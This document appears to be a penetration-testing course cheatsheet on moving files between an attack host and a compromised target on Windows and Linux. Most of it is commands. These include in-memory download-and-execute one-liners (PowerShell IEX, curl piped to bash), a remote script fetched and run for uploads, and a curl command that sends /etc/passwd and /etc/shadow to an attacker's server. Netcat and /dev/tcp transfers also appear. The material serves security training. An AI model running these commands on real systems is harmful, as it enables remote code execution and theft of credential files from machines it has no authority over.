---
title: Module 2 - File Transfers
tags: [file-transfer, windows, linux, cheatsheet]
---

# Module 2 - File Transfers
> Quick-reference cheatsheet for moving files between attack host and target.

---

## Windows — Downloads (to target)

```powershell
# Base64 decode (after encoding on Linux)
[IO.File]::WriteAllBytes("C:\Users\Public\file", [Convert]::FromBase64String("<b64string>"))

# PowerShell WebClient
(New-Object Net.WebClient).DownloadFile('<URL>', '<OutFile>')

# Invoke-WebRequest
Invoke-WebRequest <URL> -OutFile <file>

# Fileless — execute in memory
IEX (New-Object Net.WebClient).DownloadString('<URL>')

# SMB
copy \\<IP>\share\<file>
net use n: \\<IP>\share /user:test test && copy n:\<file>

# FTP
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', '<OutFile>')
```

## Windows — Uploads (from target)

```powershell
# Base64 encode → paste to attack host
[Convert]::ToBase64String((Get-Content -Path "<file>" -Encoding byte))

# Upload to Python uploadserver
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<IP>:8000/upload -File <file>

# Base64 POST to netcat
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte))
Invoke-WebRequest -Uri http://<IP>:8000/ -Method POST -Body $b64

# SMB/WebDAV
copy <file> \\<IP>\DavWWWRoot\

# FTP
(New-Object Net.WebClient).UploadFile('ftp://<IP>/<file>', '<LocalFile>')
```

---

## Linux — Downloads (to target)

```bash
# wget / curl
wget <URL> -O /tmp/<file>
curl -o /tmp/<file> <URL>

# Fileless
curl <URL> | bash
wget -qO- <URL> | python3

# /dev/tcp
exec 3<>/dev/tcp/<IP>/80
echo -e "GET /<file> HTTP/1.1\n\n">&3
cat <&3

# SCP
scp <user>@<IP>:/path/to/file .

# Base64 decode
echo -n '<b64string>' | base64 -d > <file>
```

## Linux — Uploads (from target)

```bash
# uploadserver
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
curl -X POST https://<IP>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Simple HTTP server (serve files from target)
python3 -m http.server
php -S 0.0.0.0:8000
ruby -run -ehttpd . -p8000

# SCP
scp <file> <user>@<IP>:/destination/
```

---

## Netcat

```bash
# Receive (on target)
nc -l -p 8000 > <file>

# Send (from attack host)
nc -q 0 <IP> 8000 < <file>

# Reverse — attack host listens, target connects
sudo nc -l -p 443 -q 0 < <file>    # attack host
nc <IP> 443 > <file>                 # target
```

---

## Protected Transfers

```bash
# Linux — encrypt
openssl enc -aes256 -iter 100000 -pbkdf2 -in <file> -out <file>.enc

# Linux — decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file>.enc -out <file>
```

```powershell
# Windows — encrypt/decrypt (after importing Invoke-AESEncryption.ps1)
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\<file>
Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\<file>.aes
```

---

## Integrity Check

```bash
# Linux
md5sum <file>

# Windows
Get-FileHash <file> -Algorithm MD5
```

---

## Resources

- [LOLBas](https://lolbas-project.github.io/) — Living off the land binaries (Windows)
- [GTFOBins](https://gtfobins.github.io/) — Unix binary abuse
- [Croc](https://github.com/schollz/croc) — Simple multiplatform file transfer tool
